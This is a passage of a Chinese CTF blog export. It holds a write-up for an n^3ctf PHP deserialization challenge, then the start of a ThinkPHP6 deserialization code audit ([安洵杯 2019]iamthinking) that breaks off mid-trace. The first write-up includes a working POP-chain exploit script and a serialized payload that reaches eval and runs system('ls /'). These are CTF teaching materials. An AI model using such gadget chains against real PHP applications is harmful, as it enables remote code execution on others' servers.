class="variable">$a</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b-&gt;see();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">F</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$t1</span>,<span class="variable">$t2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$s1</span> = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="variable">$s1</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>0x02:</strong></p>
<p>之后就是开始利用<code>EvilClass.php</code>了</p>
<p>前面到A的pop链比较简单：</p>
<p>1.从<code>__destruct</code>出发，利用die返回字符串调用<code>__toString</code></p>
<p>2.然后在C中实例化D，调用read方法</p>
<p>3.D中实例化F，调用<code>__call</code>魔术方法</p>
<p>4.F中实例化E，调用<code>__invoke</code>魔术方法，再实例化A进去see方法</p>
<p>之后的重点就是<code>see</code>了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">see</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="variable">$b</span> = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">       <span class="variable">$checker</span> = <span class="keyword">new</span> ReflectionClass(get_class(<span class="variable">$b</span>));</span><br><span class="line">       <span class="variable">$a</span> = basename(<span class="variable">$checker</span>-&gt;getFileName());</span><br><span class="line">       <span class="keyword">if</span>(<span class="variable">$a</span> != <span class="string">&#x27;EvilClass.php&#x27;</span>&amp;&amp;B::<span class="variable">$a</span>&amp;&amp;B::<span class="variable">$b</span>)&#123;</span><br><span class="line">           <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$b</span>-&gt;a)&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$b</span>-&gt;b))&#123;</span><br><span class="line">               <span class="variable">$func</span> = <span class="variable">$b</span>-&gt;a;</span><br><span class="line">               <span class="variable">$args</span> = <span class="variable">$b</span>-&gt;b;</span><br><span class="line">               <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\S+)\(&quot;([^)\\\\\&quot;\x00-\x19;,&#123;&#125;$]+)&quot;\)/m&#x27;</span>,<span class="string">&quot;<span class="subst">$func</span>(\&quot;<span class="subst">$args</span>\&quot;)&quot;</span>,<span class="variable">$match</span>))&#123;</span><br><span class="line">                   <span class="keyword">if</span>(!in_array(<span class="variable">$match</span>[<span class="number">1</span>],B::<span class="variable">$allowfunc</span>)&amp;&amp;function_exists(<span class="variable">$match</span>[<span class="number">1</span>]))&#123;</span><br><span class="line">                       <span class="keyword">die</span>(<span class="string">&quot;not allow&quot;</span>);</span><br><span class="line">                   &#125;</span><br><span class="line">                   <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$match</span>[1](\&quot;<span class="subst">$match</span>[2]\&quot;);&quot;</span>);</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><strong>0x03:</strong></p>
<p>这里卡了两次</p>
<p>1.从第一个if里面可以知道<code>$this-&gt;b</code>实例化的类不能是<code>EvilClass.php</code>文件中存在的类，所以现在只能利用原生类了，利用脚本找原生类的时候总是过不去，要么说未定义要么直接<code>bad request</code>，后来出了hint &gt;&gt; <code>stdClass</code>，这样第一个if和第二个if过了</p>
<p>2.第三个if进行正则匹配，一开始又试了半天，最后可以发现我们构造的payload的形式可以是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$func=var_dump(&#x27;&#x27;);system  // 如果想在var_dump里面执行命令的话，直接用反引号就可以的 var_dump(`ls`);</span><br><span class="line">$args=ls</span><br></pre></td></tr></table></figure>

<p>(之后给的那个干货好像没用过</p>
<p>exp:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// class stdClass&#123;</span></span><br><span class="line"><span class="comment">//     pubLic function __construct()&#123;</span></span><br><span class="line"><span class="comment">//         $this-&gt;a = &#x27;var_dump(`ls`);system&#x27;;</span></span><br><span class="line"><span class="comment">//         $this-&gt;b = &#x27;ls /&#x27;;</span></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> ;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>  ;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="keyword">new</span> <span class="built_in">stdClass</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b-&gt;a = <span class="string">&#x27;var_dump(`ls`);system&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b-&gt;b = <span class="string">&#x27;ls /&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">see</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// $b = $this-&gt;b; // new A</span></span><br><span class="line">        <span class="comment">// $checker = new ReflectionClass(get_class($b));</span></span><br><span class="line">        <span class="comment">// $a = basename($checker-&gt;getFileName());</span></span><br><span class="line">        <span class="comment">// if($a != &#x27;EvilClass.php&#x27;&amp;&amp;B::$a&amp;&amp;B::$b)&#123;</span></span><br><span class="line">        <span class="comment">//     if(isset($b-&gt;a)&amp;&amp;isset($b-&gt;b))&#123;</span></span><br><span class="line">        <span class="comment">//         $func = $b-&gt;a;</span></span><br><span class="line">        <span class="comment">//         $args = $b-&gt;b;</span></span><br><span class="line">        <span class="comment">//         if(preg_match(&#x27;/(\S+)\(&quot;([^)\\\\\&quot;\x00-\x19;,&#123;&#125;$]+)&quot;\)/m&#x27;,&quot;$func(\&quot;$args\&quot;)&quot;,$match))&#123;</span></span><br><span class="line">        <span class="comment">//             if(!in_array($match[1],B::$allowfunc)&amp;&amp;function_exists($match[1]))&#123;</span></span><br><span class="line">        <span class="comment">//                 die(&quot;not allow&quot;);</span></span><br><span class="line">        <span class="comment">//             &#125;</span></span><br><span class="line">        <span class="comment">//             eval(&quot;$match[1](\&quot;$match[2]\&quot;);&quot;);</span></span><br><span class="line">        <span class="comment">//         &#125;</span></span><br><span class="line">        <span class="comment">//     &#125;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$a</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$b</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$allowfunc</span> = [<span class="string">&quot;var_dump&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="keyword">new</span> D();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// $this-&gt;a-&gt;read();</span></span><br><span class="line">        <span class="comment">// return &quot;lock lock read!&quot;;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="keyword">new</span> F();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// B::$b = true;</span></span><br><span class="line">        <span class="comment">// $this-&gt;b-&gt;learn();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// B::$a = true;</span></span><br><span class="line">        <span class="comment">// $this-&gt;b-&gt;see();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// die($this-&gt;a);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">F</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="keyword">new</span> E(<span class="string">&#x27;&#x27;</span>,<span class="keyword">new</span> A());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$t1</span>,<span class="variable">$t2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// $s1 = $this-&gt;b;</span></span><br><span class="line">        <span class="comment">// $s1();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>[<span class="number">1</span>] = <span class="keyword">new</span> E(<span class="keyword">new</span> C(),<span class="string">&#x27;&#x27;</span>);;</span><br><span class="line">var_dump(serialize(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// a:1:&#123;i:1;O:1:&quot;E&quot;:2:&#123;s:1:&quot;a&quot;;O:1:&quot;C&quot;:2:&#123;s:1:&quot;a&quot;;O:1:&quot;D&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;O:1:&quot;F&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;O:1:&quot;E&quot;:2:&#123;s:1:&quot;a&quot;;s:0:&quot;&quot;;s:1:&quot;b&quot;;O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;O:8:&quot;stdClass&quot;:2:&#123;s:1:&quot;a&quot;;s:21:&quot;var_dump(`ls`);system&quot;;s:1:&quot;b&quot;;s:4:&quot;ls /&quot;;&#125;&#125;&#125;&#125;&#125;s:1:&quot;b&quot;;N;&#125;s:1:&quot;b&quot;;s:0:&quot;&quot;;&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>将结果和payload1合在一起：<br>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:2:&#123;i:0;O:22:&quot;__PHP_Incomplete_Class&quot;:1:&#123;s:3:&quot;qwb&quot;;O:9:&quot;EvilClass&quot;:0:&#123;&#125;&#125;i:1;O:1:&quot;E&quot;:2:&#123;s:1:&quot;a&quot;;O:1:&quot;C&quot;:2:&#123;s:1:&quot;a&quot;;O:1:&quot;D&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;O:1:&quot;F&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;O:1:&quot;E&quot;:2:&#123;s:1:&quot;a&quot;;s:0:&quot;&quot;;s:1:&quot;b&quot;;O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;O:8:&quot;stdClass&quot;:2:&#123;s:1:&quot;a&quot;;s:21:&quot;var_dump(`ls`);system&quot;;s:1:&quot;b&quot;;s:4:&quot;ls /&quot;;&#125;&#125;&#125;&#125;&#125;s:1:&quot;b&quot;;N;&#125;s:1:&quot;b&quot;;s:0:&quot;&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>之后再利用readflag读取就好了</p>
]]></content>
      <categories>
        <category>参加的各种比赛</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>n^3ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>代码审计</title>
    <url>/2022/03/09/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<h2 id="安洵杯-2019-iamthinking"><a href="#安洵杯-2019-iamthinking" class="headerlink" title="[安洵杯 2019]iamthinking"></a>[安洵杯 2019]iamthinking</h2><ul>
<li>thinkphp6 序列化反序列化漏洞</li>
</ul>
<p><code>/public</code><br>发现有<code>www.jpg</code>，所以就试着会不会有源码泄露，直接访问<code>www.zip</code>得到源码</p>
<span id="more"></span>

<p><strong>0x01:</strong><br>在<code>app/controller/index.php</code>里面发现反序列化函数，那么有可能可以利用<br><img src="https://img-blog.csdnimg.cn/31b03b3093fb467184b53bf71cd3ff9c.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1ZXJtb24=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>之后就可以找一下链子，可以从<code>__destruct</code>,<code>__tostring</code>,<code>__call</code>等魔术方法</p>
<p>记录一下：</p>
<p>1.先试一下<code>__destruct</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Abstractcache.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (! <span class="keyword">$this</span>-&gt;autosave) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Model.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;lazySave) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Store.php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 保存session数据</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;clearFlashData();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$sessionId</span> = <span class="keyword">$this</span>-&gt;getId();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">            <span class="variable">$data</span> = <span class="keyword">$this</span>-&gt;serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;handler-&gt;write(<span class="variable">$sessionId</span>, <span class="variable">$data</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handler-&gt;delete(<span class="variable">$sessionId</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;init = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>看了一圈之后，因为不是很懂<code>namespace</code>和<code>use</code>关键字的用法，所以先去查了一下</p>
<p>2.再回来看，感觉<code>Abstractcache.php</code>不可利用，所以就先去观察一下<code>Model.php</code>吧，先去跟踪一下save函数</p>
<p><code>Model/save()</code>，isEmpty函数要求<code>$this-&gt;data</code>不为空，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span> = [], <span class="keyword">string</span> <span class="variable">$sequence</span> = <span class="literal">null</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 数据对象赋值</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;setAttrs(<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isEmpty() || <span class="literal">false</span> === <span class="keyword">$this</span>-&gt;trigger(<span class="string">&#x27;BeforeWrite&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment"># 要求$this-&gt;data不为空，并且 $this-&gt;withEvent为true</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$result</span> = <span class="keyword">$this</span>-&gt;exists ? <span class="keyword">$this</span>-&gt;updateData() : <span class="keyword">$this</span>-&gt;insertData(<span class="variable">$sequence</span>);</span><br><span class="line">    	<span class="comment"># 进入 updateData 所以$this-&gt;exits为true</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 写入回调</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;trigger(<span class="string">&#x27;AfterWrite&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 重新记录原始数据</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;origin   = <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;set      = [];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;lazySave = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>跟踪<code>updateData</code>函数，一行一行看过去，可以在<code>    $allowFields = $this-&gt;checkAllowFields();</code>跳转到<code>checkAllowFields</code>函数之后可以发现存在我们可控的字符串拼接，也就是说可以利用<code>toString</code>方法</p>
<p><img src="http://82.156.2.166/img/iamthinking/check.png"></p>
<p>跟踪<code>ModelEvent/trigger函数</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">trigger</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$event</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;withEvent) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$call</span> = <span class="string">&#x27;on&#x27;</span> . Str::studly(<span class="variable">$event</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (method_exists(<span class="built_in">static</span>::class, <span class="variable">$call</span>)) &#123;</span><br><span class="line">                <span class="variable">$result</span> = call_user_func([<span class="built_in">static</span>::class, <span class="variable">$call</span>], <span class="keyword">$this</span>);</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (is_object(<span class="built_in">self</span>::<span class="variable">$event</span>) &amp;&amp; method_exists(<span class="built_in">self</span>::<span class="variable">$event</span>, <span class="string">&#x27;trigger&#x27;</span>)) &#123;</span><br><span class="line">                <span class="variable">$result</span> = <span class="built_in">self</span>::<span class="variable">$event</span>-&gt;trigger(<span class="built_in">static</span>::class . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$event</span>, <span class="keyword">$this</span>);</span><br><span class="line">                <span class="variable">$result</span> = <span class="keyword">empty</span>(<span class="variable">$result</span>) ? <span class="literal">true</span> : end(<span class="variable">$result</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$result</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span> === <span class="variable">$result</span> ? <span class="literal">false</span> : <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ModelEventException <span class="variable">$e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在这里我觉得<code>call_user_func([static::class, $call], $this)</code>这段代码有点可疑，但是由于对php一些语法还是不是很理解，比如对这个函数里面的<code>[static::class, $call], $this</code>就不是很理解，然后这里的<code>$call</code>在前面又会有字符串的拼接，所以应该是利用不了的，所以还是直接去找<code>toString</code>方法吧</p>
<p>3.找可利用的<code>__toString</code></p>
<p>全局搜索<code>toString</code>方法，可以在<code>Collection.php</code>和<code>Conversion.php</code>中遇到可以利用的方法，但是在<code>Collection</code>中，函数在进行到<code>toArray</code>之后就停止了，并没有可利用的点，那我们来分析<code>Conversion.php</code></p>
<p><code>__toString</code>，跟踪<code>toJson</code>方法，是对数据进行json加密，跟踪<code>toArray</code></p>
<p><img src="http://82.156.2.166/img/iamthinking/toString.png"></p>
<p><code>Conversion/toArray</code>，前半段都不会影响什么，直接跟踪<code>appendAttrToArray</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       ……</span><br><span class="line">       ……</span><br><span class="line">       ……</span><br><span class="line">       <span class="comment">// 追加属性（必须定义获取器）</span></span><br><span class="line">       <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;appendAttrToArray(<span class="variable">$item</span>, <span class="variable">$key</span>, <span class="variable">$name</span>);</span><br><span class="line">           <span class="comment"># 传入item 以及append中的键 值</span></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="variable">$item</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><code>Conversion/appendAttrToArray</code>，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">appendAttrToArray</span>(<span class="params"><span class="keyword">array</span> &amp;<span class="variable">$item</span>, <span class="variable">$key</span>, <span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (is_array(<span class="variable">$name</span>)) &#123;</span><br><span class="line">           <span class="comment">// 追加关联对象属性</span></span><br><span class="line">           <span class="variable">$relation</span>   = <span class="keyword">$this</span>-&gt;getRelation(<span class="variable">$key</span>, <span class="literal">true</span>);</span><br><span class="line">           <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span> ? <span class="variable">$relation</span>-&gt;append(<span class="variable">$name</span>)</span><br><span class="line">               -&gt;toArray() : [];</span><br><span class="line">       &#125; <span class="keyword">elseif</span> (strpos(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">           <span class="keyword">list</span>(<span class="variable">$key</span>, <span class="variable">$attr</span>) = explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">           <span class="comment">// 追加关联对象属性</span></span><br><span class="line">           <span class="variable">$relation</span>   = <span class="keyword">$this</span>-&gt;getRelation(<span class="variable">$key</span>, <span class="literal">true</span>);</span><br><span class="line">           <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span> ? <span class="variable">$relation</span>-&gt;append([<span class="variable">$attr</span>])</span><br><span class="line">               -&gt;toArray() : [];</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="variable">$value</span>       = <span class="keyword">$this</span>-&gt;getAttr(<span class="variable">$name</span>); <span class="comment"># 将值传进去</span></span><br><span class="line">           <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">$this</span>-&gt;getBindAttr(<span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$item</span>);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><code>Attribute/getAttr</code>，跟踪getData，大概会返回<code>$this-&gt;data[$name]</code>，直接跟踪getValue</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="variable">$relation</span> = <span class="literal">false</span>;</span><br><span class="line">           <span class="variable">$value</span>    = <span class="keyword">$this</span>-&gt;getData(<span class="variable">$name</span>); <span class="comment"># 返回$this-&gt;data[$name]</span></span><br><span class="line">       &#125; <span class="keyword">catch</span> (<span class="built_in">InvalidArgumentException</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">           <span class="variable">$relation</span> = <span class="keyword">$this</span>-&gt;isRelationAttr(<span class="variable">$name</span>);</span><br><span class="line">           <span class="variable">$value</span>    = <span class="literal">null</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">    	<span class="comment"># $name = $name $value = $this-&gt;data[$name] $relation = false</span></span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;getValue(<span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$relation</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><code>Attribute/getData</code>,</p>
